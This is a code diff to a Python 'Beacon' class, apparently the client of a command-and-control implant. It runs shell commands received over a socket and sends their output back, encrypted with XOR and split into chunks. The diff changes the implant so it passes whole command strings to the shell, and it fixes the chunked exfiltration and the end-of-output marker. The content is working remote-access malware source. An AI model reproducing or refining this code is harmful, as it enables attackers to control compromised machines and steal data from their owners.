@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket,subprocess,time,random,platform,psutil
+import socket,subprocess,time,random,platform
 from Crypto.Util.strxor import strxor
 
 class Beacon:
@@ -26,16 +26,15 @@ class Beacon:
 
    def run_command(self,command):
       try:
-         cmd = command.split(" ")
-         ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
+         ps = subprocess.run(command, shell=True, capture_output=True,check=True)
          if self.debugging == True:
             print("Sending:" ,ps.stdout)
          if ps.stdout != None and ps.stdout != b'':
-            if len(ps.stdout) > 65535:
-               for i in range(0, len(ps.stdout), 65535):
-                 chunk = ps.stdout[i:i+65535]
+            if len(ps.stdout) > 50000:
+               for i in range(0, len(ps.stdout), 50000):
+                 chunk = ps.stdout[i:i+50000]
                  self.sock.send(self.encrypt(chunk))
-                 self.sock.send(self.encrypt("END".encode()))
+               self.sock.send(self.encrypt("END".encode()))
             else:
                  self.sock.send(self.encrypt(ps.stdout))
                  self.sock.send(self.encrypt("END".encode()))
